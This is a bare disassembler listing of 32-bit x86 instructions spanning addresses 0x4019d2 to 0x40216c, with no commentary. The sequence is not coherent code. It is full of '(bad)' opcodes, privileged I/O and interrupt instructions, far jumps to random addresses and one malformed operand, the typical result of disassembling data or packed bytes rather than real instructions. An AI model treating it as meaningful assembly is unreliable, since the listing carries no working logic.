  4019d2:	imul   edx,DWORD PTR [ebp+0x5e],0xc94b82f8
  4019d9:	(bad)  
  4019da:	arpl   WORD PTR [edx+0x47c1bdac],cx
  4019e0:	cwde   
  4019e1:	ret    
  4019e2:	lock cdq 
  4019e4:	inc    ebp
  4019e5:	cmp    DWORD PTR [ebp-0x715080e3],edi
  4019eb:	cwde   
  4019ec:	lahf   
  4019ed:	cmp    bl,ch
  4019ef:	add    BYTE PTR [ecx],bl
  4019f1:	call   0x311d:0x39e8943a
  4019f8:	outs   dx,BYTE PTR ds:[esi]
  4019f9:	cmp    DWORD PTR [edi-0x74],edi
  4019fc:	mov    cl,0x50
  4019fe:	cld    
  4019ff:	cmp    ebp,DWORD PTR [esp+ebp*1+0x780542e2]
  401a06:	test   ecx,eax
  401a08:	(bad)  
  401a09:	jae    0x4019e7
  401a0b:	frstor [esi-0x28137e70]
  401a11:	inc    ebx
  401a12:	int    0xcc
  401a14:	lods   eax,DWORD PTR ds:[esi]
  401a15:	pusha  
  401a16:	inc    edi
  401a17:	jecxz  0x4019d4
  401a19:	pop    eax
  401a1a:	fs sub eax,0x3c7f417c
  401a20:	lds    edx,FWORD PTR [ecx+0xa57a1b0]
  401a26:	cmp    dh,bh
  401a28:	pushf  
  401a29:	(bad)  
  401a2b:	mov    BYTE PTR [edi+ebx*4+0x5ea6a528],ch
  401a32:	jecxz  0x401aa7
  401a34:	ins    BYTE PTR es:[edi],dx
  401a35:	int3   
  401a36:	(bad)  
  401a37:	ror    BYTE PTR ds:0x254183a,cl
  401a3d:	fbstp  TBYTE PTR [edx]
  401a3f:	shl    DWORD PTR [ebx+0x1ae67fc7],cl
  401a45:	sbb    eax,DWORD PTR [edi+0x2d]
  401a48:	add    cl,ah
  401a4a:	add    al,ch
  401a4c:	mov    esi,0x6e478ac
  401a51:	minps  xmm0,XMMWORD PTR [eax+0x76]
  401a55:	pop    eax
  401a56:	jecxz  0x401ac0
  401a58:	fstp   QWORD PTR [eax+0x76]
  401a5b:	std    
  401a5c:	js     0x401a81
  401a5e:	push   0x3f
  401a60:	mov    cl,0xe3
  401a62:	punpckldq mm7,mm4
  401a65:	jmp    0x401a26
  401a67:	pushf  
  401a68:	push   edx
  401a69:	leave  
  401a6a:	leave  
  401a6b:	retf   0xbcd3
  401a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a6f:	and    cl,BYTE PTR [esi]
  401a71:	arpl   WORD PTR [esi],dx
  401a73:	xchg   edi,eax
  401a74:	lds    eax,FWORD PTR [eax-0x4f]
  401a77:	mov    edi,0x90e90da4
  401a7c:	stc    
  401a7d:	in     eax,0x2a
  401a7f:	cdq    
  401a80:	or     DWORD PTR [ecx-0x44],edx
  401a83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a84:	xor    ebx,DWORD PTR [ecx]
  401a86:	je     0x401af3
  401a88:	repnz inc eax
  401a8a:	adc    ah,BYTE PTR [edi-0x5d]
  401a8d:	call   0x4421:0x2d8aa37b
  401a94:	mov    bh,0xfb
  401a96:	mov    ecx,0x1f19aeef
  401a9b:	ins    DWORD PTR es:[edi],dx
  401a9c:	repz cmp esp,DWORD PTR [eax+0x36ce1e4d]
  401aa3:	push   cs
  401aa4:	leave  
  401aa5:	ss pop edx
  401aa7:	loopne 0x401a99
  401aa9:	lea    esp,[esi+ebx*1+0x2ff92fab]
  401ab0:	jmp    0x401a53
  401ab2:	mov    dh,0x21
  401ab4:	add    DWORD PTR [ebx],esp
  401ab6:	ja     0x401a41
  401ab8:	inc    edx
  401ab9:	sub    DWORD PTR [eax],esi
  401abb:	add    DWORD PTR [edx+0x8],ebx
  401abe:	fidiv  WORD PTR [eax-0x54]
  401ac1:	cld    
  401ac2:	je     0x401ae8
  401ac4:	lahf   
  401ac5:	jmp    0xd852f294
  401aca:	add    ebp,DWORD PTR [ebx+0x1ca6dc3e]
  401ad0:	pop    ebp
  401ad1:	imul   ecx,DWORD PTR ds:0x9144cd24,0x52
  401ad8:	iret   
  401ad9:	xor    ebp,DWORD PTR [esi-0x5a]
  401adc:	mov    bh,0xb1
  401ade:	xchg   ebx,eax
  401adf:	fist   DWORD PTR [ecx+0x3f]
  401ae2:	repz add BYTE PTR [eax-0x1cd81a14],dh
  401ae9:	frstor [eax+0x359a3046]
  401aef:	xchg   edx,eax
  401af0:	loope  0x401ae8
  401af2:	call   ebx
  401af4:	pushf  
  401af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401af6:	dec    ebp
  401af7:	xlat   BYTE PTR ds:[ebx]
  401af8:	sbb    al,0x2d
  401afa:	and    DWORD PTR [ebx+0x5b67eabd],0x506e2af8
  401b04:	and    al,0x6c
  401b06:	push   cs
  401b07:	mov    esi,0x2b97e554
  401b0c:	(bad)  
  401b0d:	dec    eax
  401b0e:	mov    ds:0xe740f67d,eax
  401b13:	hlt    
  401b14:	inc    ebp
  401b15:	fdecstp 
  401b17:	inc    esi
  401b18:	sub    eax,0x5d03e0b0
  401b1d:	xchg   ebx,eax
  401b1e:	pop    ecx
  401b1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b20:	adc    cl,cl
  401b22:	loop   0x401b96
  401b24:	inc    edi
  401b25:	pop    edi
  401b26:	sub    eax,0x42b2214f
  401b2b:	sbb    eax,0x33b45cfa
  401b30:	and    DWORD PTR [esi-0x31],esi
  401b33:	push   ebx
  401b34:	or     DWORD PTR [esi-0x45],ecx
  401b37:	(bad)  
  401b38:	jmp    0x401abd
  401b3a:	outs   dx,BYTE PTR ds:[esi]
  401b3b:	call   0xd7da:0x1442cd19
  401b42:	mov    bh,0x1a
  401b44:	sbb    ecx,DWORD PTR [ecx-0x17]
  401b47:	mov    cl,0x5f
  401b49:	xchg   esi,eax
  401b4a:	jae    0x401b6c
  401b4c:	jno    0x401aff
  401b4e:	mov    ds:0xbb897ccd,eax
  401b53:	sar    BYTE PTR [edi+0x29],0xe2
  401b57:	popa   
  401b58:	dec    ecx
  401b59:	mov    esi,0x504d2da
  401b5e:	dec    ebx
  401b5f:	(bad)  
  401b60:	jne    0x401b8f
  401b62:	jmp    0x401afc
  401b64:	cmc    
  401b65:	in     eax,dx
  401b66:	sahf   
  401b67:	add    ecx,edx
  401b69:	fsub   QWORD PTR [ecx]
  401b6b:	rcl    DWORD PTR [ebx+0x27],0x31
  401b6f:	pushf  
  401b70:	shr    DWORD PTR [esi-0x5e2a47ea],0x66
  401b77:	jb     0x401b84
  401b79:	mov    esp,0x25f1cbb4
  401b7f:	sar    BYTE PTR [esi+0x76b667c4],cl
  401b85:	mov    ?,WORD PTR [edi+edx*2-0x9]
  401b89:	lock fld DWORD PTR [ebp+0x3b278251]
  401b90:	or     al,0x26
  401b92:	cld    
  401b93:	adc    al,0x91
  401b95:	fiadd  WORD PTR [esp+esi*1]
  401b98:	ja     0x401ba2
  401b9a:	(bad)  
  401b9b:	nop
  401b9c:	jp     0x401be4
  401b9e:	dec    esp
  401b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ba0:	fadd   QWORD PTR [esi+0x752549ee]
  401ba6:	jg     0x401b2a
  401ba8:	sti    
  401ba9:	mov    es,WORD PTR [edx-0x69]
  401bac:	mov    cl,0x1a
  401bae:	in     eax,dx
  401baf:	ja     0x401b9e
  401bb1:	pop    ebx
  401bb2:	mov    bl,0x7f
  401bb4:	jae    0x401bb4
  401bb6:	xor    edi,eax
  401bb8:	fxtract 
  401bba:	mov    ds:0x128d6b4c,al
  401bbf:	gs pop ebp
  401bc1:	jo     0x401c2c
  401bc3:	xchg   ecx,eax
  401bc4:	dec    ecx
  401bc5:	xchg   edx,eax
  401bc6:	push   0xffffff8b
  401bc8:	xchg   ecx,eax
  401bc9:	ret    0xc376
  401bcc:	pop    ecx
  401bcd:	sahf   
  401bce:	sahf   
  401bcf:	les    esp,FWORD PTR [esi-0x63]
  401bd2:	add    DWORD PTR [ecx+edx*8+0x4b],ecx
  401bd6:	pop    ebp
  401bd7:	mov    esp,0xcd28e6ac
  401bdc:	scas   al,BYTE PTR es:[edi]
  401bdd:	js     0x401b8a
  401bdf:	xor    cl,BYTE PTR [eax-0x37]
  401be2:	pop    esp
  401be3:	push   DWORD PTR [edi+0x705efb2f]
  401be9:	loopne 0x401c42
  401beb:	arpl   WORD PTR [edx-0x1d79d96c],si
  401bf1:	jg     0x401c6c
  401bf3:	cmp    ch,bl
  401bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bf6:	retf   
  401bf7:	mov    esi,0x1748246c
  401bfc:	lds    esi,FWORD PTR [ecx-0xd]
  401bff:	mov    DWORD PTR ss:[ecx+0x19],ebp
  401c03:	xor    eax,0x1ca22d55
  401c08:	iret   
  401c09:	daa    
  401c0a:	call   0x10c2:0x4d02925f
  401c11:	(bad)  
  401c12:	outs   dx,DWORD PTR ds:[esi]
  401c13:	push   es
  401c14:	aad    0x8f
  401c16:	adc    ecx,DWORD PTR [edi+0x20]
  401c19:	or     al,0x70
  401c1b:	mov    ds:0xdc52ea71,al
  401c20:	mov    cs,ebx
  401c22:	jo     0x401bea
  401c24:	retf   0x4d9e
  401c27:	into   
  401c28:	in     al,dx
  401c29:	push   ss
  401c2a:	fcom   DWORD PTR [ebp-0x1bcb53d2]
  401c30:	sbb    al,0x7a
  401c32:	loope  0x401c84
  401c34:	(bad)  
  401c36:	jmp    0xd251aa38
  401c3b:	sub    DWORD PTR [edi-0x5073f764],0xffffffd3
  401c42:	seto   BYTE PTR [ecx]
  401c45:	mov    ebx,0x3b940370
  401c4a:	mov    bl,0x49
  401c4c:	jp     0x401c06
  401c4e:	sti    
  401c4f:	mov    DWORD PTR [edi-0x3ce775bd],esp
  401c55:	mov    esi,0x6235e516
  401c5a:	push   ecx
  401c5b:	lods   eax,DWORD PTR ds:[esi]
  401c5c:	out    dx,eax
  401c5d:	dec    edx
  401c5e:	cs inc eax
  401c60:	sbb    eax,0xe1927f12
  401c65:	sti    
  401c66:	push   0xa
  401c68:	sar    DWORD PTR [ecx],1
  401c6a:	in     al,dx
  401c6b:	mov    ch,0x9a
  401c6d:	sub    al,0xd8
  401c6f:	sbb    al,0xd5
  401c71:	neg    DWORD PTR [eax]
  401c73:	cdq    
  401c74:	push   edi
  401c75:	lea    esi,[edx-0x58]
  401c78:	or     eax,0x8f1f2f5a
  401c7d:	cs retf 0x60b3
  401c81:	inc    esp
  401c82:	or     DWORD PTR [edx-0x5],ecx
  401c85:	sub    ebx,DWORD PTR [eax-0x68]
  401c88:	mov    DWORD PTR [ecx-0x5b],ebx
  401c8b:	jl     0x401c9b
  401c8d:	fld    DWORD PTR [ebx-0x2507caa3]
  401c93:	or     bh,BYTE PTR [ebp-0x743f46a8]
  401c99:	push   edi
  401c9a:	mov    dh,0x52
  401c9c:	add    ebx,DWORD PTR [esi-0x40]
  401c9f:	icebp  
  401ca0:	cdq    
  401ca1:	ss inc esi
  401ca3:	jbe    0x401c6e
  401ca5:	aaa    
  401ca6:	ds cwde 
  401ca8:	pushf  
  401ca9:	inc    eax
  401caa:	push   ss
  401cab:	mov    ecx,0x7be86428
  401cb0:	mov    dl,0x7c
  401cb3:	repnz aad 0x38
  401cb6:	mov    dh,0xd5
  401cb8:	jnp    0x401ca5
  401cba:	in     al,dx
  401cbb:	test   eax,0xc402ed54
  401cc0:	xor    edx,DWORD PTR [eax]
  401cc2:	sub    DWORD PTR [ebx+0x7113b71c],ecx
  401cc8:	shr    DWORD PTR [ecx+0x7e],cl
  401ccb:	out    dx,eax
  401ccc:	jmp    0x1581c8d6
  401cd1:	add    bl,dl
  401cd3:	jo     0x401d05
  401cd5:	mov    esi,0x74063b23
  401cda:	and    eax,edi
  401cdc:	clc    
  401cdd:	mov    BYTE PTR [eax],0x95
  401ce0:	pop    ecx
  401ce1:	cmp    DWORD PTR ds:0x78722baf,edx
  401ce7:	or     ch,BYTE PTR [edx]
  401ce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cea:	mov    esp,0xfde6e5c7
  401cef:	out    dx,eax
  401cf0:	pop    ss
  401cf1:	test   BYTE PTR [ebp+0x2b2c7b60],bh
  401cf7:	daa    
  401cf8:	xor    eax,0xdc458b30
  401cfd:	add    edi,edx
  401cff:	or     edi,DWORD PTR [ebx]
  401d01:	push   ss
  401d02:	retf   
  401d03:	adc    ah,BYTE PTR [edx]
  401d05:	stos   DWORD PTR es:[edi],eax
  401d06:	hlt    
  401d07:	fild   QWORD PTR [edi+0x6663d35e]
  401d0d:	scas   eax,DWORD PTR es:[edi]
  401d0e:	pop    edx
  401d0f:	sbb    edi,DWORD PTR [edx+0xc619354]
  401d15:	sbb    ebx,edi
  401d17:	dec    ebx
  401d18:	repz imul esi,DWORD PTR [ebx+edx*8-0x7a989d79],0x76
  401d21:	mov    ebp,0xfe281bec
  401d26:	mov    esi,0x656f3bf2
  401d2b:	xchg   BYTE PTR [edi+esi*8+0x1ccdc388],dl
  401d32:	xchg   edi,eax
  401d33:	push   es
  401d34:	pop    es
  401d35:	dec    eax
  401d36:	xor    ch,ch
  401d38:	bound  eax,QWORD PTR [ecx+edx*8-0x19]
  401d3c:	das    
  401d3d:	ins    DWORD PTR es:[edi],dx
  401d3e:	pusha  
  401d3f:	sahf   
  401d40:	cmp    eax,DWORD PTR ds:0x9745d62a
  401d46:	loop   0x401dc3
  401d48:	jmp    0x60bebde5
  401d4d:	dec    esi
  401d4e:	push   0x3d137b16
  401d53:	jecxz  0x401d6b
  401d55:	mov    eax,ds:0xb15d5ffa
  401d5a:	dec    edi
  401d5b:	adc    cl,BYTE PTR ds:0xbb089b92
  401d61:	and    DWORD PTR [ebp+0xc],esi
  401d64:	xor    edi,DWORD PTR [esp+esi*4]
  401d67:	scas   eax,DWORD PTR es:[edi]
  401d68:	daa    
  401d69:	and    DWORD PTR [ebx-0x1e4fa8ff],0x1e
  401d70:	js     0x401d9e
  401d72:	pusha  
  401d73:	xor    eax,0xcd0e5978
  401d78:	dec    eax
  401d79:	inc    esi
  401d7a:	imul   edi,DWORD PTR [ecx],0x5a
  401d7d:	and    al,0x1c
  401d7f:	pop    es
  401d80:	sub    al,dl
  401d82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d83:	rcr    BYTE PTR [ecx+0x5d],0x95
  401d87:	xor    ecx,DWORD PTR [eax-0x3a]
  401d8a:	mov    eax,0xeb3bfc59
  401d8f:	cmovle ecx,edi
  401d92:	and    BYTE PTR [edx+0x62fbbd27],0x9d
  401d99:	popa   
  401d9a:	rol    DWORD PTR [edx],1
  401d9c:	xor    cl,BYTE PTR [ecx+0x3cdcaec9]
  401da2:	cli    
  401da3:	adc    ebx,DWORD PTR [ecx+0x77fb992b]
  401da9:	(bad)  
  401dab:	or     al,BYTE PTR [ebp+0x52]
  401dae:	test   al,0x92
  401db0:	dec    esp
  401db1:	lods   al,BYTE PTR ds:[esi]
  401db2:	mul    DWORD PTR [ecx]
  401db4:	jno    0x401d3d
  401db6:	aad    0x6e
  401db8:	push   ss
  401db9:	clc    
  401dba:	(bad)  
  401dbb:	mov    edx,0x9b9029f6
  401dc0:	rol    ecx,0xe4
  401dc3:	inc    esp
  401dc4:	jne    0x401dda
  401dc6:	in     eax,0x4d
  401dc8:	outs   dx,DWORD PTR ds:[esi]
  401dc9:	and    esp,DWORD PTR [edx-0x35b4063e]
  401dcf:	sbb    al,0x84
  401dd1:	stos   DWORD PTR es:[edi],eax
  401dd2:	stos   DWORD PTR es:[edi],eax
  401dd3:	add    cl,BYTE PTR [ebp-0x6d6f1751]
  401dd9:	(bad)  
  401dda:	in     eax,0x8e
  401ddc:	jecxz  0x401dff
  401dde:	push   ecx
  401ddf:	jle    0x401dee
  401de1:	adc    eax,0xbea905c1
  401de6:	ror    dl,0xad
  401de9:	call   0x9123:0xc345893
  401df0:	fwait
  401df1:	cmp    DWORD PTR [ebx],edi
  401df3:	inc    ebp
  401df4:	nop
  401df5:	pushf  
  401df6:	jmp    0x26426987
  401dfb:	(bad)  
  401dfc:	aad    0xbf
  401dfe:	test   al,0x21
  401e00:	pop    esp
  401e01:	test   al,0x81
  401e03:	or     edx,DWORD PTR [esi]
  401e05:	stos   DWORD PTR es:[edi],eax
  401e06:	pusha  
  401e07:	int    0x68
  401e09:	mov    bl,0xc4
  401e0b:	dec    edi
  401e0c:	cli    
  401e0d:	xchg   ebx,eax
  401e0e:	add    eax,0x20770614
  401e13:	mov    ecx,0xa5946b1e
  401e18:	lods   al,BYTE PTR ds:[esi]
  401e19:	fadd   st(3),st
  401e1b:	test   al,0x2f
  401e1d:	xchg   edi,eax
  401e1e:	or     ah,bl
  401e20:	push   0x42995ba1
  401e25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e26:	loope  0x401da9
  401e28:	fisub  DWORD PTR [eax]
  401e2a:	arpl   WORD PTR [esi],cx
  401e2c:	pop    ebp
  401e2d:	jg     0x401de7
  401e2f:	ret    
  401e30:	loopne 0x401eb1
  401e32:	test   DWORD PTR [eax],ebx
  401e34:	in     eax,0x41
  401e36:	dec    esp
  401e37:	outs   dx,BYTE PTR ds:[esi]
  401e38:	sbb    al,0x64
  401e3a:	cli    
  401e3b:	ds dec ebx
  401e3d:	dec    eax
  401e3e:	ss xchg edx,eax
  401e40:	dec    ebx
  401e41:	mov    al,0xb4
  401e43:	ins    DWORD PTR es:[edi],dx
  401e44:	outs   dx,BYTE PTR gs:[esi]
  401e46:	out    0x59,eax
  401e48:	xchg   esi,eax
  401e49:	mov    bh,0xd2
  401e4b:	sbb    DWORD PTR [ebx-0x5e],edx
  401e4e:	(bad)  ds:0xbf0c84cc
  401e54:	psadbw mm2,mm0
  401e57:	mov    bl,0x20
  401e59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e5a:	dec    ebx
  401e5b:	jne    0x401de0
  401e5d:	retf   0x9f0e
  401e60:	daa    
  401e61:	js     0x401eb6
  401e63:	lock or al,BYTE PTR [ebp-0x51]
  401e67:	frstor [esi]
  401e69:	mov    edi,0x22d2861e
  401e6e:	rol    DWORD PTR [edi+0x47],1
  401e71:	(bad)  
  401e72:	loopne 0x401ed4
  401e74:	ja     0x401ead
  401e76:	sbb    eax,0xebfefeb4
  401e7b:	aas    
  401e7c:	dec    BYTE PTR [edi+0xa]
  401e7f:	in     eax,0x81
  401e81:	xchg   ecx,eax
  401e82:	mov    bl,0xb8
  401e84:	shl    dh,1
  401e86:	add    dl,dl
  401e88:	lods   al,BYTE PTR ds:[esi]
  401e89:	rcl    DWORD PTR [eax+0x150bddcf],cl
  401e8f:	ds and eax,0xc3abacfd
  401e95:	and    BYTE PTR [edx+0x6c],dh
  401e98:	xor    ebp,esi
  401e9a:	push   esi
  401e9b:	enter  0x659a,0x51
  401e9f:	dec    ebx
  401ea0:	lahf   
  401ea1:	icebp  
  401ea2:	std    
  401ea3:	pop    ebp
  401ea4:	inc    ecx
  401ea5:	retf   0xfb87
  401ea8:	or     eax,0x785cfb5c
  401ead:	je     0x401ee0
  401eaf:	popf   
  401eb0:	les    ebx,FWORD PTR [ebx-0xa7b76fb]
  401eb6:	adc    DWORD PTR [ebx-0x20],edi
  401eb9:	push   edx
  401eba:	rcr    BYTE PTR [ebp+0x2e72a792],0xcd
  401ec1:	test   DWORD PTR [eax+0x362fe4ab],ebx
  401ec7:	shl    BYTE PTR [ebx+0x15],cl
  401eca:	or     ah,ch
  401ecc:	aam    0x45
  401ece:	retf   0x70
  401ed1:	out    0x4b,al
  401ed3:	dec    edi
  401ed4:	std    
  401ed5:	std    
  401ed6:	lods   al,BYTE PTR fs:[esi]
  401ed8:	hlt    
  401ed9:	adc    DWORD PTR [ecx],ebp
  401edb:	add    al,0xf1
  401edd:	popa   
  401ede:	call   0xc2f572ca
  401ee3:	mov    edx,0xdcf2631e
  401ee8:	aas    
  401ee9:	jae    0x401e81
  401eeb:	div    DWORD PTR [ebx-0x2a7f4047]
  401ef1:	(bad)  
  401ef2:	jle    0x401e7b
  401ef4:	mov    eax,0x900185a6
  401ef9:	xchg   ebp,eax
  401efa:	nop
  401efb:	mov    cl,0xef
  401efd:	mov    edi,0x629a3bd0
  401f02:	jae    0x401f3a
  401f04:	xchg   ebp,eax
  401f05:	pop    esp
  401f06:	xchg   esp,eax
  401f07:	xchg   ecx,eax
  401f08:	push   edx
  401f09:	cmp    al,0x9
  401f0b:	loopne 0x401f17
  401f0d:	xchg   esi,eax
  401f0e:	pop    ebx
  401f0f:	push   esi
  401f10:	(bad)  
  401f11:	adc    al,BYTE PTR [ebx-0x35]
  401f14:	aam    0x98
  401f16:	add    cl,dl
  401f18:	fild   QWORD PTR [eax]
  401f1a:	daa    
  401f1b:	stos   BYTE PTR es:[edi],al
  401f1c:	sub    esi,DWORD PTR [eax+0x3e]
  401f1f:	xchg   ecx,eax
  401f20:	pop    esi
  401f21:	mov    eax,0x9d20766b
  401f26:	dec    ecx
  401f27:	(bad)  
  401f28:	cmp    eax,0x3905c9c3
  401f2d:	and    edx,eax
  401f2f:	arpl   WORD PTR [esi+0x22c9a60],dx
  401f35:	loopne 0x401f14
  401f37:	ds cs aad 0x2e
  401f3b:	dec    ebp
  401f3c:	scas   eax,DWORD PTR es:[edi]
  401f3d:	and    BYTE PTR [edx+0x41],bh
  401f40:	push   ebx
  401f41:	std    
  401f42:	xchg   BYTE PTR [ebx],cl
  401f44:	imul   esp,DWORD PTR [ebx-0x51],0xaf4de7a8
  401f4b:	mov    dl,0xa
  401f4d:	mov    al,0x2
  401f4f:	out    dx,al
  401f50:	sti    
  401f51:	out    0x45,al
  401f53:	sub    ah,BYTE PTR [esp+ebp*4-0xaf0caaa]
  401f5a:	push   esi
  401f5b:	mov    al,ds:0xa0a7e33e
  401f60:	test   al,0x98
  401f62:	loop   0x401f39
  401f64:	aam    0xfb
  401f66:	mov    WORD PTR [ecx],ss
  401f68:	push   ebx
  401f69:	or     BYTE PTR [esi-0x70418139],cl
  401f6f:	and    ecx,DWORD PTR [esi+esi*8]
  401f72:	or     eax,0x7d5b2217
  401f77:	and    eax,0xa249f7b2
  401f7c:	pop    ebx
  401f7d:	pusha  
  401f7e:	lock imul edi,DWORD PTR [ebp+0x42],0x39
  401f83:	pushf  
  401f84:	cmp    al,BYTE PTR [eax]
  401f86:	cs or  al,0x4c
  401f89:	cmp    BYTE PTR [ecx+0x7f],cl
  401f8c:	push   ds
  401f8d:	fiadd  DWORD PTR [edi+0x4b48aee]
  401f93:	retf   
  401f94:	retf   
  401f95:	mov    edx,0x3a11c9e7
  401f9a:	fidivr WORD PTR [eax+0x69]
  401f9d:	jge    0x401f68
  401f9f:	(bad)  
  401fa0:	mov    ch,0xd6
  401fa2:	pop    ds
  401fa3:	pushf  
  401fa4:	or     eax,0x35731730
  401fa9:	pop    es
  401faa:	test   al,0x3c
  401fac:	inc    ebp
  401fad:	mov    esi,0x5b21aeae
  401fb2:	inc    ecx
  401fb3:	out    0x86,eax
  401fb5:	jle    0x401fca
  401fb7:	pop    es
  401fb8:	out    0xff,al
  401fba:	and    al,0xae
  401fbc:	leave  
  401fbd:	addr16 xchg edi,eax
  401fbf:	add    eax,0xb9b14ba5
  401fc4:	jmp    0x5ccb158
  401fc9:	nop
  401fca:	shr    DWORD PTR [esi],cl
  401fcc:	cs jmp 0x1e61102a
  401fd2:	dec    ecx
  401fd3:	cmp    eax,0x17ecf954
  401fd8:	dec    ebx
  401fd9:	sti    
  401fda:	popa   
  401fdb:	xchg   ecx,eax
  401fdc:	xor    ah,al
  401fde:	sbb    eax,0xd56c782a
  401fe3:	scas   eax,DWORD PTR es:[edi]
  401fe4:	scas   al,BYTE PTR es:[edi]
  401fe5:	sub    BYTE PTR [esi*4+0x555b8698],0x3d
  401fed:	mov    edx,0x63b0e709
  401ff2:	jecxz  0x402018
  401ff4:	or     al,dh
  401ff6:	pop    eax
  401ff7:	outs   dx,DWORD PTR ds:[esi]
  401ff8:	mov    eax,0xc19f33cb
  401ffd:	mov    ebx,0x23f13d02
  402002:	sub    DWORD PTR [edx+0x1f],0xffffff97
  402006:	repz sti 
  402008:	fst    DWORD PTR [edi+0x30]
  40200b:	inc    eax
  40200c:	rcl    BYTE PTR [ebx+0x36],1
  40200f:	mov    bl,0x3a
  402011:	sub    al,0x1b
  402013:	mov    edi,0x816940d1
  402018:	sbb    DWORD PTR [edx+0x52],0xfdbe912a
  40201f:	xchg   esi,eax
  402020:	mov    dl,0x95
  402022:	pop    esi
  402023:	mov    ch,0xd8
  402025:	adc    dl,BYTE PTR [eax-0x3]
  402028:	pop    es
  402029:	aaa    
  40202a:	repz fisub DWORD PTR [esi]
  40202d:	rcl    DWORD PTR [ebp-0x77],1
  402030:	mov    cs,esi
  402032:	dec    edi
  402033:	xchg   ebp,eax
  402034:	fcom   QWORD PTR [esi]
  402036:	xchg   esi,eax
  402037:	retf   0x7a98
  40203a:	and    esi,esp
  40203c:	xchg   BYTE PTR [edx-0x6e],dh
  40203f:	(bad)  [edx]
  402041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402042:	cmp    DWORD PTR [ecx+0x5dbe7721],ebp
  402048:	jge    0x40208d
  40204a:	sub    eax,0xc101c7c4
  40204f:	sub    eax,0x58fc8e5f
  402054:	popf   
  402055:	pushf  
  402056:	dec    esp
  402057:	pop    ebp
  402058:	jg     0x402051
  40205a:	push   eax
  40205b:	loop   0x401ff1
  40205d:	inc    esp
  40205e:	popf   
  40205f:	lds    ebp,FWORD PTR [ebx-0x37]
  402062:	or     eax,DWORD PTR [ecx-0x39b18eb5]
  402068:	pop    eax
  402069:	dec    eax
  40206a:	mov    dh,0x43
  40206c:	mov    ah,0x1f
  40206e:	push   eax
  40206f:	gs fcmovb st,st(2)
  402072:	inc    eax
  402073:	cmp    BYTE PTR [ebp-0x59],ch
  402076:	gs mov esi,0xb2833d30
  40207c:	cmp    al,bh
  40207e:	retf   0x8083
  402081:	pop    ss
  402082:	imul   ebp,DWORD PTR [edx],0x4c
  402085:	push   esi
  402086:	dec    ebx
  402087:	mov    ecx,0x1ad43421
  40208c:	in     eax,dx
  40208d:	sub    DWORD PTR [esi+0x72],0xdd0307b2
  402094:	add    dh,bh
  402096:	pop    eax
  402097:	pop    ebx
  402098:	inc    ecx
  402099:	add    eax,0x72186a9
  40209e:	add    eax,0x59dd8f94
  4020a3:	cdq    
  4020a4:	jb     0x4020b6
  4020a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020a7:	jg     0x402099
  4020a9:	mov    bh,0x56
  4020ab:	(bad)  
  4020ac:	pop    ss
  4020ad:	outs   dx,DWORD PTR ds:[esi]
  4020ae:	xor    al,0x62
  4020b0:	test   eax,0x319ddc55
  4020b5:	outs   dx,DWORD PTR ds:[esi]
  4020b6:	test   BYTE PTR [edx+0x54e75938],bl
  4020bc:	sbb    al,BYTE PTR [eax]
  4020be:	mov    ds:0xa66bc610,al
  4020c3:	dec    esi
  4020c4:	hlt    
  4020c5:	popa   
  4020c6:	pop    ebp
  4020c7:	sbb    eax,0x70581e2a
  4020cc:	es stc 
  4020ce:	dec    ebx
  4020cf:	lock int3 
  4020d1:	cld    
  4020d2:	sbb    ebp,DWORD PTR [eax+0x4a]
  4020d5:	jge    0x4020e5
  4020d7:	jecxz  0x4020f9
  4020d9:	xor    al,0x2e
  4020db:	mov    edx,0xcb3c36e
  4020e0:	xchg   ebp,eax
  4020e1:	jae    0x40214f
  4020e3:	inc    esi
  4020e4:	and    BYTE PTR [ebp+0x484bedaa],bh
  4020ea:	lds    eax,FWORD PTR [esi-0x47f36ccc]
  4020f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020f1:	cwde   
  4020f2:	mov    BYTE PTR [edi],bl
  4020f4:	mov    bl,0x2a
  4020f6:	xchg   BYTE PTR [ebx-0x5f7cd242],bl
  4020fc:	mov    ah,0x8
  4020fe:	add    DWORD PTR [esi+edx*1-0x7f],edi
  402102:	cdq    
  402103:	retf   
  402104:	pop    esi
  402105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402106:	test   DWORD PTR [esi],0x1f10d9d7
  40210c:	pop    ecx
  40210d:	mov    ds:0xa00070db,al
  402112:	inc    ecx
  402113:	inc    ebp
  402114:	jo     0x402150
  402116:	add    al,0xc1
  402118:	xlat   BYTE PTR ds:[ebx]
  402119:	inc    eax
  40211a:	lods   eax,DWORD PTR ds:[esi]
  40211b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40211c:	cmp    ch,dl
  40211e:	mov    bl,0x2b
  402120:	xor    ebp,DWORD PTR [esi+0x260d5618]
  402126:	adc    DWORD PTR [edx-0x396a80fd],edx
  40212c:	lea    ebp,[esi]
  40212e:	(bad)  
  40212f:	cdq    
  402130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402131:	fdivr  DWORD PTR [eax+0x1c]
  402134:	clc    
  402135:	xchg   eax,edx
  402137:	adc    eax,0x174d25d0
  40213c:	pop    eax
  40213d:	push   ebx
  40213e:	pusha  
  40213f:	and    al,0xac
  402141:	out    0x33,eax
  402143:	rcr    BYTE PTR [eax+ecx*4],0xb4
  402147:	sub    DWORD PTR [ebx+0x2f],eax
  40214a:	es jae 0x40213a
  40214d:	in     eax,0x87
  40214f:	add    DWORD PTR [ecx+0x51001a5a],esi
  402155:	jmp    0x4021a9
  402157:	adc    eax,0xe2a48764
  40215c:	mov    bl,0xe7
  40215e:	test   DWORD PTR [edx-0x4c93eaa9],ebp
  402164:	mov    ah,BYTE PTR ds:0x37ebe88a
  40216a:	push   ecx
  40216b:	scas   al,BYTE PTR es:[edi]
  40216c:	idiv   BYTE PTR [edi]
